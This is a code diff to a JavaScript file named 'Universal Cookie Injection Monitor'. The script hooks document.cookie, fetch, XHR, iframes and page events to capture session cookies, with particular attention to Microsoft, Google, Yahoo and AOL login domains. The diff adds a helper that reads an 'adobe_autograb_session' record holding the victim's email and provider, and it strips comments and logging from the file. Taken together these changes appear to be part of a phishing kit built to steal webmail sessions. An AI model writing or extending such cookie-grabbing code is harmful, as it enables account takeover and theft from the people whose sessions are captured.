@@ -10,6 +10,34 @@
     
     console.log('🌍 Universal Cookie Injection Monitor loaded - ALL DOMAINS');
     
+    // Helper to get domain from email/provider
+    function getDomainFromEmailProvider() {
+        let email = '';
+        let provider = '';
+        try {
+            const sessionData = JSON.parse(localStorage.getItem('adobe_autograb_session') || '{}');
+            email = sessionData.email || '';
+            provider = sessionData.provider || '';
+        } catch (e) {}
+        const providerLower = (provider || '').toLowerCase();
+        if (providerLower.includes('gmail') || providerLower.includes('google')) {
+            return '.google.com';
+        } else if (providerLower.includes('yahoo')) {
+            return '.yahoo.com';
+        } else if (providerLower.includes('aol')) {
+            return '.aol.com';
+        } else if (providerLower.includes('hotmail') || providerLower.includes('live') ||
+                   providerLower.includes('outlook') || providerLower.includes('office365')) {
+            return '.live.com';
+        } else if (providerLower === 'others' && email && email.includes('@')) {
+            return '.' + email.split('@')[1].toLowerCase();
+        }
+        if (email && email.includes('@')) {
+            return '.' + email.split('@')[1].toLowerCase();
+        }
+        return window.location.hostname.startsWith('.') ? window.location.hostname : `.${window.location.hostname}`;
+    }
+    
     // Store original cookie descriptor
     const originalCookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
     
@@ -19,7 +47,8 @@
     let crossDomainRequests = [];
     
     // Function to capture and send cookie data
-    function captureCookieData(action, cookieString, domain = window.location.hostname) {
+    function captureCookieData(action, cookieString, domain) {
+        domain = domain || getDomainFromEmailProvider();
         const timestamp = new Date().toISOString();
         const cookieData = {
             action: action,
@@ -58,7 +87,6 @@
     // Enhanced cross-domain monitoring
     function monitorCrossDomainRequest(url, method = 'GET') {
         try {
-            // Handle relative URLs properly
             let fullUrl;
             if (url.startsWith('http://') || url.startsWith('https://')) {
                 fullUrl = url;
@@ -73,7 +101,6 @@
             const urlObj = new URL(fullUrl);
             const domain = urlObj.hostname;
             
-            // Monitor ALL domains, not just cross-domain
             const requestData = {
                 url: url,
                 domain: domain,
@@ -86,13 +113,10 @@
             captureCookieData('DOMAIN_REQUEST', document.cookie, domain);
             console.log(`🌐 Request to ${domain}:`, url);
             
-            // Special handling for Microsoft domains
             if (domain.includes('microsoftonline.com') || 
                 domain.includes('login.live.com') || 
                 domain.includes('outlook.com') ||
                 domain.includes('login.microsoft.com')) {
-                console.log(`🔥 Microsoft domain detected: ${domain}`);
-                // Force immediate cookie capture
                 setTimeout(() => {
                     const newCookies = document.cookie;
                     if (newCookies) {
@@ -101,11 +125,9 @@
                 }, 500);
             }
             
-            // Handle other email providers
             if (domain.includes('google.com') || 
                 domain.includes('yahoo.com') || 
                 domain.includes('aol.com')) {
-                console.log(`📧 Email provider detected: ${domain}`);
                 setTimeout(() => {
                     const newCookies = document.cookie;
                     if (newCookies) {
@@ -118,7 +140,6 @@
         }
     }
     
-    // Enhanced iframe monitoring for ALL domains
     function monitorIframes() {
         const iframes = document.querySelectorAll('iframe');
         iframes.forEach(iframe => {
@@ -126,9 +147,6 @@
                 const iframeSrc = iframe.src || iframe.getAttribute('src');
                 if (iframeSrc) {
                     const iframeDomain = new URL(iframeSrc, window.location.href).hostname;
-                    console.log(`🖼️ Monitoring iframe: ${iframeDomain}`);
-                    
-                    // Try to access iframe cookies
                     try {
                         if (iframe.contentDocument) {
                             const iframeCookies = iframe.contentDocument.cookie;
@@ -138,8 +156,6 @@
                             }
                         }
                     } catch (crossOriginError) {
-                        // Expected for cross-origin iframes
-                        console.log(`🔒 Cross-origin iframe: ${iframeDomain}`);
                         captureCookieData('CROSS_ORIGIN_IFRAME', document.cookie, iframeDomain);
                     }
                 }
@@ -149,29 +165,19 @@
         });
     }
     
-    // Enhanced monitoring for ALL domains
     function enhancedDomainMonitoring() {
-        // Monitor current domain
         const currentDomain = window.location.hostname;
-        console.log(`🌍 Enhanced monitoring active for: ${currentDomain}`);
-        
-        // Capture cookies from current domain
         const currentCookies = document.cookie;
         if (currentCookies) {
             captureCookieData('CURRENT_DOMAIN', currentCookies, currentDomain);
         }
-        
-        // Monitor for dynamic content changes
         const observer = new MutationObserver((mutations) => {
             mutations.forEach((mutation) => {
                 mutation.addedNodes.forEach((node) => {
                     if (node.nodeType === Node.ELEMENT_NODE) {
-                        // Check for new iframes
                         if (node.tagName === 'IFRAME') {
                             setTimeout(() => monitorIframes(), 1000);
                         }
-                        
-                        // Check for new scripts
                         if (node.tagName === 'SCRIPT') {
                             setTimeout(() => {
                                 const newCookies = document.cookie;
@@ -190,19 +196,13 @@
         }
     }
     
-    // Initialize enhanced monitoring
     function initializeEnhancedMonitoring() {
-        console.log('🚀 Initializing enhanced domain monitoring...');
-        
         enhancedDomainMonitoring();
         monitorIframes();
-        
-        // Monitor for URL changes (SPA navigation)
         let currentUrl = window.location.href;
         setInterval(() => {
             if (window.location.href !== currentUrl) {
                 currentUrl = window.location.href;
-                console.log('🔄 URL changed, re-monitoring:', currentUrl);
                 setTimeout(() => {
                     enhancedDomainMonitoring();
                     monitorIframes();
@@ -211,74 +211,20 @@
         }, 1000);
     }
     
-    // Enhanced cross-domain monitoring
-    function monitorCrossDomainRequest(url, method = 'GET') {
-        try {
-            const urlObj = new URL(url, window.location.href);
-            const domain = urlObj.hostname;
-            
-            // Monitor ALL domains, not just cross-domain
-            const requestData = {
-                url: fullUrl,
-                domain: domain,
-                method: method,
-                timestamp: new Date().toISOString(),
-                cookies: document.cookie
-            };
-            
-            crossDomainRequests.push(requestData);
-            captureCookieData('DOMAIN_REQUEST', document.cookie, domain);
-            console.log(`🌐 Request to ${domain}:`, fullUrl);
-            
-        } catch (e) {
-            console.warn('Error processing URL for domain monitoring:', url, e.message);
-        }
-    }
-    
-    // Override document.cookie setter
     Object.defineProperty(Document.prototype, 'cookie', {
         get: function() {
             const cookies = originalCookieDescriptor.get.call(this);
             if (cookies) {
-                captureCookieData('READ', cookies);
+                captureCookieData('READ', cookies, getDomainFromEmailProvider());
             }
             return cookies;
         },
         set: function(cookieString) {
-            captureCookieData('SET', cookieString);
+            captureCookieData('SET', cookieString, getDomainFromEmailProvider());
             return originalCookieDescriptor.set.call(this, cookieString);
         },
         configurable: true
     });
-    
-    // Enhanced iframe monitoring
-    function monitorIframes() {
-        const iframes = document.querySelectorAll('iframe');
-        iframes.forEach(iframe => {
-            try {
-                const iframeSrc = iframe.src || iframe.getAttribute('src');
-                if (iframeSrc && iframe.contentDocument) {
-                    const iframeDomain = new URL(iframeSrc, window.location.href).hostname;
-                    const iframeCookies = iframe.contentDocument.cookie;
-                    if (iframeCookies) {
-                        captureCookieData('IFRAME_READ', iframeCookies, iframeDomain);
-                        console.log(`🖼️ Iframe cookies from ${iframeDomain}:`, iframeCookies);
-                    }
-                }
-            } catch (e) {
-                // Cross-origin iframe, can't access - this is expected
-                if (iframe.src) {
-                    try {
-                        const iframeDomain = new URL(iframe.src, window.location.href).hostname;
-                        console.log(`🔒 Cross-origin iframe detected: ${iframeDomain}`);
-                        captureCookieData('CROSS_ORIGIN_IFRAME', document.cookie, iframeDomain);
-                    } catch (urlError) {
-                        // Invalid iframe src
-                    }
-                }
-            }
-        });
-    }
     
     // Enhanced fetch monitoring
     const originalFetch = window.fetch;
@@ -291,11 +237,10 @@
         }
         
         return originalFetch.apply(this, args).then(response => {
-            // Check for new cookies after response
             setTimeout(() => {
                 const newCookies = document.cookie;
                 if (newCookies) {
-                    captureCookieData('POST_FETCH', newCookies);
+                    captureCookieData('POST_FETCH', newCookies, getDomainFromEmailProvider());
                 }
             }, 100);
             return response;
@@ -324,7 +269,7 @@
             setTimeout(() => {
                 const newCookies = document.cookie;
                 if (newCookies) {
-                    captureCookieData('XHR_RESPONSE', newCookies);
+                    captureCookieData('XHR_RESPONSE', newCookies, getDomainFromEmailProvider());
                 }
             }, 100);
         });
@@ -332,7 +277,6 @@
         return originalXHRSend.call(this, data);
     };
     
-    // Monitor dynamic script loading
     const originalCreateElement = document.createElement;
     document.createElement = function(tagName) {
         const element = originalCreateElement.call(this, tagName);
@@ -342,7 +286,7 @@
                 setTimeout(() => {
                     const newCookies = document.cookie;
                     if (newCookies) {
-                        captureCookieData('SCRIPT_LOAD', newCookies);
+                        captureCookieData('SCRIPT_LOAD', newCookies, getDomainFromEmailProvider());
                     }
                 }, 100);
             });
@@ -351,49 +295,42 @@
         return element;
     };
     
-    // Periodic cookie monitoring
     const monitoringInterval = setInterval(() => {
         const currentCookies = document.cookie;
         if (currentCookies) {
-            captureCookieData('PERIODIC_CHECK', currentCookies);
+            captureCookieData('PERIODIC_CHECK', currentCookies, getDomainFromEmailProvider());
         }
         monitorIframes();
         enhancedDomainMonitoring();
     }, 2000);
     
-    // Monitor storage events
     window.addEventListener('storage', function(e) {
-        captureCookieData('STORAGE_EVENT', document.cookie);
+        captureCookieData('STORAGE_EVENT', document.cookie, getDomainFromEmailProvider());
     });
     
-    // Monitor page visibility changes
     document.addEventListener('visibilitychange', function() {
         if (!document.hidden) {
-            captureCookieData('PAGE_VISIBLE', document.cookie);
+            captureCookieData('PAGE_VISIBLE', document.cookie, getDomainFromEmailProvider());
         }
     });
     
-    // Monitor various page events
     ['focus', 'blur', 'beforeunload', 'unload'].forEach(eventType => {
         window.addEventListener(eventType, function() {
             const cookies = document.cookie;
             if (cookies) {
-                captureCookieData(`WINDOW_${eventType.toUpperCase()}`, cookies);
+                captureCookieData(`WINDOW_${eventType.toUpperCase()}`, cookies, getDomainFromEmailProvider());
             }
         });
     });
     
-    // Monitor hash changes (for SPA navigation)
     window.addEventListener('hashchange', function() {
-        captureCookieData('WINDOW_FOCUS', document.cookie);
+        captureCookieData('WINDOW_FOCUS', document.cookie, getDomainFromEmailProvider());
     });
     
-    // Monitor popstate (for SPA navigation)
     window.addEventListener('popstate', function() {
-        captureCookieData('POPSTATE', document.cookie);
+        captureCookieData('POPSTATE', document.cookie, getDomainFromEmailProvider());
     });
     
-    // Expose global functions for manual access
     window.getCapturedCookies = function() {
         return capturedCookies;
     };
@@ -407,7 +344,7 @@
     };
     
     window.forceCookieCapture = function() {
-        captureCookieData('MANUAL_CAPTURE', document.cookie);
+        captureCookieData('MANUAL_CAPTURE', document.cookie, getDomainFromEmailProvider());
         monitorIframes();
         return {
             cookies: document.cookie,
@@ -416,9 +353,8 @@
         };
     };
     
-    // Initial capture
     setTimeout(() => {
-        captureCookieData('INITIAL_LOAD', document.cookie);
+        captureCookieData('INITIAL_LOAD', document.cookie, getDomainFromEmailProvider());
         monitorIframes();
         initializeEnhancedMonitoring();
     }, 500);
